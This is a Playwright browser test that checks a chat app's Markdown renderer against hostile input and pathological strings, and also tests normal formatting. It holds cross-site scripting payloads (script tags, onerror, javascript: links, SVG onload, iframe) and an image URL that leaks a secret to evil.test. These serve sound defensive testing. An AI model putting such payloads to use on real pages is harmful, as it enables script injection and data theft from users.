// Browser test for the Markdown renderer in app/static/index.html (needs Playwright + Chromium; not part of CI).
//
//   (APP_VERSION=test AIDEFENSE_MODE=gateway LLM_BASE_URL=http://127.0.0.1:1 LLM_API_KEY=x \
//      uvicorn app.main:app --port 8095 &)           # LLM is not needed, only the static page
//   NODE_PATH=$(npm root -g) node tests/browser/markdown.test.js http://localhost:8095/
const { chromium } = require('playwright');

const URL = process.argv[2] || 'http://localhost:8095/';
let failed = 0;
const check = (name, ok, extra) => { console.log((ok ? 'PASS ' : 'FAIL ') + name + (ok ? '' : '  ' + (extra || ''))); if (!ok) failed++; };

(async () => {
  const b = await chromium.launch(); const p = await b.newPage();
  const pageErrors = []; p.on('pageerror', e => pageErrors.push(e.message));
  let dialog = false; p.on('dialog', d => { dialog = true; d.dismiss(); });
  await p.goto(URL); await p.waitForFunction(() => typeof renderMarkdown === 'function');

  // render(md) -> {html, text, q: selector counts}
  const run = (md, sels = []) => p.evaluate(([md, sels]) => {
    const el = renderMarkdown(md);
    document.body.appendChild(el);              // attach, so any injected handler would fire
    const out = {html: el.innerHTML, text: el.textContent, n: {}};
    for (const s of sels) out.n[s] = el.querySelectorAll(s).length;
    el.remove(); return out;
  }, [md, sels]);

  // ---------- hostile input ----------
  let r = await run('<script>alert(1)</script> <img src=x onerror="alert(2)"> <b>x</b> **bold**', ['script', 'img', 'b', 'strong']);
  check('raw HTML is shown as text, never parsed', r.n.script === 0 && r.n.img === 0 && r.n.b === 0 && r.n.strong === 1 && r.text.includes('<script>alert(1)</script>'), JSON.stringify(r.n));
  r = await run('[click me](javascript:alert(1)) and [data](data:text/html,<script>alert(1)</script>)', ['a']);
  check('javascript: and data: links are not links', r.n.a === 0 && r.text.includes('javascript:alert(1)'), r.html);
  r = await run('![tracking](http://evil.test/p.png?d=SECRET) ![x](https://evil.test/y.gif)', ['img', 'a']);
  check('images are never loaded or linked', r.n.img === 0 && r.n.a === 0 && r.text.includes('image not shown') && !r.html.includes('evil.test'), r.html);
  r = await run('[ok](https://example.com/a?b=1&c=2) see https://example.com/x. and http://[::1', ['a']);
  const hrefs = await p.evaluate(() => { const e = renderMarkdown('[ok](https://example.com/a?b=1&c=2) see https://example.com/x.'); return [...e.querySelectorAll('a')].map(a => [a.href, a.rel, a.target, a.textContent]); });
  check('http(s) links get noopener, new tab; trailing dot is not part of the url', hrefs.length === 2 && hrefs[0][0] === 'https://example.com/a?b=1&c=2' && hrefs[0][1] === 'noopener noreferrer' && hrefs[0][2] === '_blank' && hrefs[1][3] === 'https://example.com/x', JSON.stringify(hrefs));
  r = await run('<a href="javascript:alert(1)">x</a> <svg onload=alert(1)> <iframe src=//evil></iframe>', ['a', 'svg', 'iframe']);
  check('html tags of every kind stay inert', r.n.a === 0 && r.n.svg === 0 && r.n.iframe === 0);
  check('no script ever ran', dialog === false);

  // ---------- normal Markdown ----------
  r = await run('(1250 + 89.99) × 1.1 = **1473.989**', ['strong']);
  check('the reply from the screenshot: bold number, no stray asterisks', r.n.strong === 1 && !r.text.includes('*') && r.text.includes('1473.989'), r.text);
  r = await run('**a** *b* ~~c~~ and 5 * 3 * 2 = 30 and \\*literal\\*', ['strong', 'em', 'del']);
  check('bold, italic, strike; spaced asterisks and escapes stay literal', r.n.strong === 1 && r.n.em === 1 && r.n.del === 1 && r.text.includes('5 * 3 * 2') && r.text.includes('*literal*'), JSON.stringify(r.n));
  r = await run('Use `kb_read` and get_customer or send_email_now', ['code', 'em']);
  check('snake_case words are not italic; backticks make code', r.n.code === 1 && r.n.em === 0 && r.text.includes('get_customer or send_email_now'));
  r = await run('# Title\n## Sub\n\nParagraph one\nsame paragraph\n\n---\n\n> quoted\n> text', ['h3', 'h4', 'p', 'br', 'hr', 'blockquote']);
  check('headings, paragraphs and quote with line breaks, rule', r.n.h3 === 1 && r.n.h4 === 1 && r.n.p === 2 && r.n.br === 2 && r.n.hr === 1 && r.n.blockquote === 1, JSON.stringify(r.n));
  r = await run('- a\n  - b\n  - c\n- d\n\n3. three\n4. four', ['ul', 'ul ul', 'li', 'ol']);
  const start = await p.evaluate(() => renderMarkdown('3. three\n4. four').querySelector('ol').start);
  check('nested bullet list and ordered list that starts at 3', r.n.ul === 2 && r.n['ul ul'] === 1 && r.n.li === 6 && r.n.ol === 1 && start === 3, JSON.stringify(r.n) + ' start=' + start);
  r = await run('```python\nprint("<b>x</b>")\n  indented()\n```\nafter', ['.code', 'pre code', 'button', 'b']);
  const codeText = await p.evaluate(() => renderMarkdown('```python\nprint("<b>x</b>")\n  indented()\n```').querySelector('pre code').textContent);
  check('fenced code keeps text exactly, has a Copy button, html inside stays text', codeText === 'print("<b>x</b>")\n  indented()' && r.n['.code'] === 1 && r.n.button === 1 && r.n.b === 0, codeText);
  r = await run('| Name | Cost |\n|:--|--:|\n| Laptop | **1200** |\n| Mouse | 30 |', ['table', 'th', 'tbody tr', 'strong']);
  const al = await p.evaluate(() => [...renderMarkdown('| A | B |\n|:--|--:|\n| 1 | 2 |').querySelectorAll('th')].map(t => t.style.textAlign));
  check('table with alignment and inline formatting', r.n.table === 1 && r.n.th === 2 && r.n['tbody tr'] === 2 && r.n.strong === 1 && al.join() === 'left,right', JSON.stringify(r.n) + al);
  r = await run('', []);
  check('empty text renders nothing', r.html === '');

  // ---------- abusive input must stay fast (no catastrophic regex backtracking) ----------
  const evil = {
    stars: '*'.repeat(60000), ticks: '`'.repeat(60000), brackets: '['.repeat(40000), boldopen: '**a '.repeat(15000),
    italopen: '*a '.repeat(20000), links: '[a](https://x.test/'.repeat(5000), tilde: '~~a '.repeat(15000),
    pipes: ('| a '.repeat(50) + '\n').repeat(800), lists: '- x\n'.repeat(20000), deep: '> '.repeat(500) + 'x',
  };
  for (const [name, text] of Object.entries(evil)) {
    const ms = await p.evaluate(t => { const s = performance.now(); renderMarkdown(t); return performance.now() - s; }, text);
    check('fast on ' + name + ' (' + Math.round(ms) + ' ms)', ms < 1500, ms + ' ms');
  }
  const huge = await p.evaluate(() => { const e = renderMarkdown('x'.repeat(150000)); return [e.children.length, e.textContent.length]; });
  check('over 100000 characters: shown as plain text', huge[0] === 0 && huge[1] === 150000);

  check('no page errors', pageErrors.length === 0, pageErrors.join('; '));
  await b.close();
  console.log(failed ? `\n${failed} FAILED` : '\nall passed');
  process.exit(failed ? 1 : 0);
})().catch(e => { console.error('ERROR', e.message); process.exit(2); });
